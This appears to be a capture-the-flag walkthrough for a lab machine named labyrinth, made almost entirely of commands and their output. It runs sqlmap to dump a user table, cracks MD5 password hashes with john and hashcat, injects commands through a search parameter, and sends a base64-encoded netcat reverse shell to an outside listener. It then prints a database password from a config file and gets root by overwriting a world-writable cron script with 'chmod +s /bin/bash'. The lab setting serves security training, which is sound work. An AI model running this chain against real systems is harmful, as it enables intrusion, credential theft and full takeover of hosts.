`sqlmap -r sqlmapreq.txt --random-agent --batch --dump-all -p 'namePeople' -T 'people' --columns namePeople,passwordPeople`

```jsx
+------------+--------------+----------------------------------+--------------------+
| idCreature | nameCreature | passwordCreature                 | permissionCreature |
+------------+--------------+----------------------------------+--------------------+
| 1          | Cerberos     | 3898e56bf6fa6ddfc3c0977c514a65a8 | user               |
| 2          | Pegasus      | 5d20441c392b68c61592b2159990abfe | user               |
| 3          | Chiron       | f847149233ae29ec0e1fcf052930c044 | user               |
| 4          | Centaurus    | ea5540126c33fe653bf56e7a686b1770 | user               |
```

> **Password Cracking Phase**
> 

`nano userspassword.txt`

```jsx
Eurycliedes:42354020b68c7ed28dcdeabd5a2baf8e
Menekrates:0b3bebe266a81fbfaa79db1604c4e67f
Philostratos:b83f966a6f5a9cff9c6e1c52b0aa635b
Daedalus:b8e4c23686a3a12476ad7779e35f5eb6
M!n0taur:1765db9457f496a39859209ee81fbda4
```

`hashid '42354020b68c7ed28dcdeabd5a2baf8e'`

```jsx
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5
```

`sudo john --wordlist=/usr/share/wordlists/rockyou.txt userspassword.txt --format=raw-md5`

```jsx
greeklover       (Eurycliedes)     
greeksalad       (Menekrates)     
nickthegreek     (Philostratos)     
aminotauro       (M!n0taur) 
```

`hashcat -m 0 userspassword.txt /usr/share/wordlists/rockyou.txt --username`

```jsx
42354020b68c7ed28dcdeabd5a2baf8e:greeklover               
0b3bebe266a81fbfaa79db1604c4e67f:greeksalad               
b83f966a6f5a9cff9c6e1c52b0aa635b:nickthegreek 
1765db9457f496a39859209ee81fbda4:aminotauro
```

> **Internal Panel Investigation & Remote Code Execution Phase**
> 

![image.png](image%209.png)

![image.png](image%2010.png)

![image.png](image%2011.png)

![image.png](image%2012.png)

`curl --path-as-is -iskL -s -k -X $'GET' -b $'PHPSESSID=o02plqn1jrqfr7ii2njravck1n' $'http://labyrinth.thm/echo.php?search=|+whoami'`

```jsx
[REDACTED] - MORE

</html>
daemon
<div>daemon</div> 
```

`curl --path-as-is -iskL -s -k -X $'GET' -b $'PHPSESSID=o02plqn1jrqfr7ii2njravck1n' $'http://labyrinth.thm/echo.php?search=|+which+python3'`

```jsx
[REDACTED] - MORE

</html>
/usr/bin/python3
<div>/usr/bin/python3</div> 
```

`curl --path-as-is -iskL -s -k -X $'GET' -b $'PHPSESSID=o02plqn1jrqfr7ii2njravck1n' $'http://labyrinth.thm/echo.php?search=|+which+netcat'`

```jsx
</html>
/bin/netcat
<div>/bin/netcat</div> 
```

> **Reverse Shell Phase**
> 

`echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.2.37.37 10001 >/tmp/f' | base64 -w0`

```jsx
cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxMC4yLjM3LjM3IDEwMDAxID4vdG1wL2YK
```

`nc -nlvp 10001`

```jsx
listening on [any] 10001 ...
```

![image.png](image%2013.png)

**PAYLOAD:**

```jsx
cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxMC4yLjM3LjM3IDEwMDAxID4vdG1wL2YK | base64 -d | bash
```

```jsx
listening on [any] 10001 ...
connect to [10.2.37.37] from (UNKNOWN) [10.10.47.44] 42036
bash: cannot set terminal process group (786): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied

daemon@labyrinth:/opt/lampp/htdocs$ whoami
daemon
daemon@labyrinth:/opt/lampp/htdocs$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
daemon@labyrinth:/opt/lampp/htdocs$ pwd
/opt/lampp/htdocs

daemon@labyrinth:/opt/lampp/htdocs$ export TERM=xterm

daemon@labyrinth:/opt/lampp/htdocs$ ls -lsa /home
total 20
4 drwxr-xr-x  5 root     root     4096 jún   18  2021 .
4 drwxr-xr-x 26 root     root     4096 nov    9  2021 ..
4 drwxr-xr-x  2 anonftp  anonftp  4096 jún   18  2021 anonftp
4 drwxr-xr-x 18 minotaur minotaur 4096 nov    9  2021 minotaur
4 drwxr-xr-x  2 daemon   daemon   4096 jún   15  2021 user

daemon@labyrinth:/opt/lampp/htdocs$ dpkg --version
dpkg: warning: failed to open configuration file '/root/.dpkg.cfg' for reading: Permission denied
Debian 'dpkg' package management program version 1.19.0.5 (amd64).
This is free software; see the GNU General Public License version 2 or
later for copying conditions. There is NO warranty.

daemon@labyrinth:/opt/lampp/htdocs$ uname -a
Linux labyrinth 5.4.0-90-generic #101~18.04.1-Ubuntu SMP Fri Oct 22 09:25:04 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux

daemon@labyrinth:/opt/lampp/htdocs$ groups
daemon

daemon@labyrinth:/opt/lampp/htdocs$ 
```

> **Internal System Enumeration Phase**
> 

```jsx
daemon@labyrinth:/opt/lampp/htdocs$ find / -type f -perm -u=s 2>/dev/null

/usr/bin/traceroute6.iputils
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/arping
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/lib/xorg/Xorg.wrap
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/sbin/pppd
/bin/fusermount
/bin/su
/bin/umount
/bin/mount
/bin/ping
/opt/lampp/bin/suexec
/snap/core18/2128/bin/mount
/snap/core18/2128/bin/ping
/snap/core18/2128/bin/su
/snap/core18/2128/bin/umount
/snap/core18/2128/usr/bin/chfn
/snap/core18/2128/usr/bin/chsh
/snap/core18/2128/usr/bin/gpasswd
/snap/core18/2128/usr/bin/newgrp
/snap/core18/2128/usr/bin/passwd
/snap/core18/2128/usr/bin/sudo
/snap/core18/2128/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2128/usr/lib/openssh/ssh-keysign
/snap/core18/2246/bin/mount
/snap/core18/2246/bin/ping
/snap/core18/2246/bin/su
/snap/core18/2246/bin/umount
/snap/core18/2246/usr/bin/chfn
/snap/core18/2246/usr/bin/chsh
/snap/core18/2246/usr/bin/gpasswd
/snap/core18/2246/usr/bin/newgrp
/snap/core18/2246/usr/bin/passwd
/snap/core18/2246/usr/bin/sudo
/snap/core18/2246/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2246/usr/lib/openssh/ssh-keysign
/snap/core20/1081/usr/bin/chfn
/snap/core20/1081/usr/bin/chsh
/snap/core20/1081/usr/bin/gpasswd
/snap/core20/1081/usr/bin/mount
/snap/core20/1081/usr/bin/newgrp
/snap/core20/1081/usr/bin/passwd
/snap/core20/1081/usr/bin/su
/snap/core20/1081/usr/bin/sudo
/snap/core20/1081/usr/bin/umount
/snap/core20/1081/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1081/usr/lib/openssh/ssh-keysign
/snap/core20/1169/usr/bin/chfn
/snap/core20/1169/usr/bin/chsh
/snap/core20/1169/usr/bin/gpasswd
/snap/core20/1169/usr/bin/mount
/snap/core20/1169/usr/bin/newgrp
/snap/core20/1169/usr/bin/passwd
/snap/core20/1169/usr/bin/su
/snap/core20/1169/usr/bin/sudo
/snap/core20/1169/usr/bin/umount
/snap/core20/1169/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1169/usr/lib/openssh/ssh-keysign
/snap/snapd/13170/usr/lib/snapd/snap-confine
/snap/snapd/13640/usr/lib/snapd/snap-confine

daemon@labyrinth:/opt/lampp/htdocs$ find /etc -writable 2>/dev/null
/etc/systemd/system/apache-htcacheclean.service
/etc/systemd/system/vsftpd.service
/etc/systemd/system/mysql.service
/etc/systemd/system/apache2.service

daemon@labyrinth:/opt/lampp/htdocs$ find / -type f -iname "*.php" 2>/dev/null

[REDACTED] - MORE

daemon@labyrinth:/opt/lampp/htdocs$ find / -type f -iname "dbConnect.php" 2>/dev/null

/opt/lampp/htdocs/dbConnect.php
/var/www/html/dbConnect.php

daemon@labyrinth:/opt/lampp/htdocs$ cat /opt/lampp/htdocs/dbConnect.php

<?php

        $servername = "localhost";
        $db = "labyrinth";
        $usr = "root";
        $pwd = "";
        //$pwd = "bQXHS5KnfGAHaa383nFjT42AUMyWb";
        try {
                $conn = new PDO("mysql:host=$servername;dbname=$db", $usr, $pwd);
                $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

        } catch (PDOException $e) {
                die();
        }

?>

daemon@labyrinth:/$ cd /
daemon@labyrinth:/$ ls -lsa

total 728648
     4 drwxr-xr-x  26 root root      4096 nov    9  2021 .
     4 drwxr-xr-x  26 root root      4096 nov    9  2021 ..
     4 drwxr-xr-x   2 root root      4096 szept 20  2021 bin
     4 drwxr-xr-x   3 root root      4096 dec    3 11:52 boot
     4 drwxrwxr-x   2 root root      4096 jún   15  2021 cdrom
     0 drwxr-xr-x  17 root root      4100 dec    3 11:49 dev
    12 drwxr-xr-x 126 root root     12288 nov   10  2021 etc
     4 drwxr-xr-x   5 root root      4096 jún   18  2021 home
     0 lrwxrwxrwx   1 root root        32 nov    9  2021 initrd.img -> boot/initrd.img-5.4.0-90-generic
     0 lrwxrwxrwx   1 root root        32 nov    9  2021 initrd.img.old -> boot/initrd.img-5.4.0-89-generic
     4 drwxr-xr-x  21 root root      4096 jún   15  2021 lib
     4 drwxr-xr-x   2 root root      4096 szept 20  2021 lib64
    16 drwx------   2 root root     16384 jún   15  2021 lost+found
     4 drwxr-xr-x   2 root root      4096 aug    7  2020 media
     4 drwxr-xr-x   2 root root      4096 aug    7  2020 mnt
     4 drwxr-xr-x   3 root root      4096 jún   15  2021 opt
     0 dr-xr-xr-x 238 root root         0 dec    3 11:48 proc
     4 drwxr-xr-x   2 root root      4096 jún   15  2021 reminders
     4 drwx------   7 root root      4096 jún   15  2021 root
     0 drwxr-xr-x  29 root root       900 dec    3 11:54 run
    12 drwxr-xr-x   2 root root     12288 szept 20  2021 sbin
     4 drwxr-xr-x  14 root root      4096 szept 23  2021 snap
     4 drwxr-xr-x   2 root root      4096 jún   16  2021 srv
728532 -rw-------   1 root root 746009600 jún   15  2021 swapfile
     0 dr-xr-xr-x  13 root root         0 dec    3 11:48 sys
     4 drwxrwxrwx   2 root root      4096 jún   15  2021 timers
     4 drwxrwxrwt  13 root root      4096 dec    3 13:52 tmp
     4 drwxr-xr-x  11 root root      4096 aug    7  2020 usr
     4 drwxr-xr-x  16 root root      4096 jún   15  2021 var
     0 lrwxrwxrwx   1 root root        29 nov    9  2021 vmlinuz -> boot/vmlinuz-5.4.0-90-generic
     0 lrwxrwxrwx   1 root root        29 nov    9  2021 vmlinuz.old -> boot/vmlinuz-5.4.0-89-generic

daemon@labyrinth:/$ ls -lsa /reminders
total 56
 4 drwxr-xr-x  2 root root  4096 jún   15  2021 .
 4 drwxr-xr-x 26 root root  4096 nov    9  2021 ..
48 -rw-r--r--  1 root root 43982 dec    3 14:01 dontforget.txt

daemon@labyrinth:/$ ls -lsa /timers
total 12
4 drwxrwxrwx  2 root root 4096 jún   15  2021 .
4 drwxr-xr-x 26 root root 4096 nov    9  2021 ..
4 -rwxrwxrwx  1 root root   70 jún   15  2021 timer.sh

daemon@labyrinth:/$ cat /timers/timer.sh
#!/bin/bash
echo "dont fo...forge...ttt" >> /reminders/dontforget.txt

daemon@labyrinth:/$ 
```

> **Privilege Escalation with Internal Logic Phase**
> 

```jsx
daemon@labyrinth:/$ ls -lsa /timers/timer.sh
4 -rwxrwxrwx 1 root root 70 jún   15  2021 /timers/timer.sh
daemon@labyrinth:/$ 
```

`nc -nlvp 10122`

```jsx
listening on [any] 10122 ...
```

```jsx
daemon@labyrinth:/$ echo 'chmod +s /bin/bash' > /timers/timer.sh
daemon@labyrinth:/$ /bin/bash -p

bash-4.4# whoami
whoami
root
bash-4.4# id
id
uid=1(daemon) gid=1(daemon) euid=0(root) egid=0(root) groups=0(root),1(daemon)
bash-4.4# 

```